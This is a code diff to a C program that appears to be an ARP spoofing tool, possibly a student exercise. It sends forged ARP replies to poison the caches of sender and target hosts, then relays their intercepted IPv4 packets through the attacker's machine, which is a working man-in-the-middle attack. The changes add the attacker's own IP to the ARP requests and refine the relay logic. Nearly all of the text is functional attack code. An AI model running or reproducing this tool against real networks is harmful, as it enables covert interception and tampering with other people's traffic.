@@ -22,7 +22,7 @@
 #define byte uint8_t
 
 int flag = 1;
-
+byte attacker[4];
 typedef struct arp_packet {
     struct libnet_ethernet_hdr eth_hdr;
     struct libnet_arp_hdr arp_hdr;
@@ -51,6 +51,17 @@ void func(pcap_t * pcap, byte  sender_mac[1000][6],struct arp_pair * pairs,byte 
     return;
 }
 
+char * getIfToIP(char *ifName){
+    int fd;
+    struct ifreq ifr;
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, ifName, IFNAMSIZ-1);
+    ioctl(fd, SIOCGIFADDR, &ifr);
+    close(fd);
+    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+}
+  
 void print_mac_address(const byte *mac) {
     for (int i = 0; i < ETHER_ADDR_LEN; i++) {
         printf("%02x", mac[i]);
@@ -150,7 +161,8 @@ void arp_spoofing(pcap_t * pcap,const char *dev, struct arp_pair *pairs, int pai
         print_mac_address(attacker_mac);
         get_sender_mac(pcap,i+1,argv,dev,&sender_mac);
         reply_target_to_sender(packet, sender_mac, pairs[i].sender, pairs[i].target,attacker_mac);
-        for (int j=0;j<10;j++){
+        for (int j=0;j<1;j++){
+             
             if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
             
                 fprintf(stderr, "failed to send ARP");
@@ -185,7 +197,7 @@ void get_sender_mac(pcap_t * pcap,int cnt, char **argv, const char *dev,byte *se
     inet_pton(AF_INET, argv[2 * cnt], src_ip);
     inet_pton(AF_INET, argv[2 * cnt + 1], dst_ip);
 
-    request_broad(pack, src_mac, dst_ip, src_ip); //(pack, attacker_mac, target_ip, sender_ip)
+    request_broad(pack, src_mac, attacker, src_ip); //(pack, attacker_mac, attacker_ip, sender_ip)
     if (pcap == NULL) {
         fprintf(stderr, "pcap_open_live error\n");
         exit(1);
@@ -213,7 +225,7 @@ void get_sender_mac(pcap_t * pcap,int cnt, char **argv, const char *dev,byte *se
             
             printBuffer(src_ip,4);
 
-            if (!memcmp(arp_reply->src_ip,src_ip,4)){
+            if ( !memcmp(arp_reply->src_ip,src_ip,4)&&!memcmp(arp_reply->dst_ip,attacker,4)){
                 
                 if (ntohs(arp_reply->eth_hdr.ether_type) == ETHERTYPE_ARP) {
                     
@@ -251,7 +263,7 @@ void get_target_mac(pcap_t* pcap,int cnt, char **argv, const char *dev,byte *tar
     printf("hihi\n");
     printBuffer(src_ip,4);
     printBuffer(dst_ip,4);
-    request_broad(pack, src_mac, src_ip, dst_ip); //(pack, attacker_mac, sender_ip, target_ip)
+    request_broad(pack, src_mac, attacker, dst_ip); //(pack, attacker_mac, attacker_ip, target_ip)
     if (pcap == NULL) {
         fprintf(stderr, "pcap_open_live error\n");
         exit(1);
@@ -279,7 +291,7 @@ void get_target_mac(pcap_t* pcap,int cnt, char **argv, const char *dev,byte *tar
             
             printBuffer(dst_ip,4);
 
-            if (!memcmp(arp_reply->src_ip,dst_ip,4)){
+            if (!memcmp(arp_reply->src_ip,dst_ip,4)&&!memcmp(arp_reply->dst_ip,attacker,4)){
                 
                 if (ntohs(arp_reply->eth_hdr.ether_type) == ETHERTYPE_ARP) {
                     
@@ -307,18 +319,20 @@ int main(int argc, char **argv) {
         printf("Usage: %s <interface> <sender ip> <target ip> [<sender ip> <target ip> ...]\n", argv[0]);
         exit(1);
     }
+    byte * x = getIfToIP(argv[1]);
+    inet_pton(AF_INET,x,attacker);
+    printBuffer(attacker,4);
     char errbuf[PCAP_ERRBUF_SIZE];
     time_t start, end;
     double passed;
     start = time(NULL);
-    pthread_t thread;
     const char *dev = argv[1];
     int pair_cnt = (argc - 2) / 2;
     struct arp_pair pairs[pair_cnt];
     byte sender[1000][4];
     byte target[1000][4];
+    byte attack[4];
     pcap_t * pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-
     for(int i = 0; i < pair_cnt; i++) {
         strcpy(pairs[i].sender, argv[2 + i * 2]);
         strcpy(pairs[i].target, argv[3 + i * 2]);
@@ -331,6 +345,7 @@ int main(int argc, char **argv) {
         
         get_sender_mac(pcap,i,argv,dev,&sender_mac[i-1]);
         get_target_mac(pcap,i,argv,dev,&target_mac[i-1]);
+        printf("==%d\n",i);
     }
     
     printf("start\n");
@@ -368,12 +383,12 @@ int main(int argc, char **argv) {
                 struct libnet_ipv4_hdr* ipv4 = (struct libnet_ipv4_hdr*)(packet + sizeof(struct libnet_ethernet_hdr));
                 
                 for (int i = 0; i < pair_cnt; i++) { //relay
-                    if ((!memcmp(&ipv4->ip_src,sender[i],4) && !memcmp(&eth->ether_dhost,attacker_mac,6))&& (!memcmp(&ipv4->ip_src,sender[i],4))){
+                    if ((!memcmp(&eth->ether_shost,sender_mac[i],6) && !memcmp(&eth->ether_dhost,attacker_mac,6))&&memcmp(&ipv4->ip_dst,attacker,4)){
                         //printBuffer(eth,sizeof(struct libnet_ethernet_hdr)+ntohs(ipv4->ip_len));
                         size=sizeof(struct libnet_ethernet_hdr)+ntohs(ipv4->ip_len);
                         memcpy(eth->ether_shost,attacker_mac,6);
                         memcpy(eth->ether_dhost,target_mac[i],6);
-                        //printf("size: %d",size);
+                       
 
                         if (pcap_sendpacket(pcap,(const byte *)eth, sizeof(struct libnet_ethernet_hdr)+ntohs(ipv4->ip_len)) != 0) {
             
@@ -383,21 +398,7 @@ int main(int argc, char **argv) {
                         break;
                     }
                     
-                    /*else if((!memcmp(&eth->ether_shost,target_mac[i],6) && !memcmp(&eth->ether_dhost,attacker_mac,6)) && !memcmp(&ipv4->ip_dst,sender[i],4)){
-                        memcpy(eth->ether_shost,attacker_mac,6);
-                        memcpy(eth->ether_dhost,sender_mac[i],6);
-                        printf("relay to sender\n");
-
-                        printBuffer(eth,sizeof(struct libnet_ethernet_hdr)+ntohs(ipv4->ip_len));
-                        if (pcap_sendpacket(pcap,(const byte *)eth, sizeof(struct libnet_ethernet_hdr)+ntohs(ipv4->ip_len)) != 0) {
-            
-                            fprintf(stderr, "failed to send relay to sender\n");
-                        
-                        }
-                        break;
-
-                    }*/
-                 
+                    
                 }
                 
             }
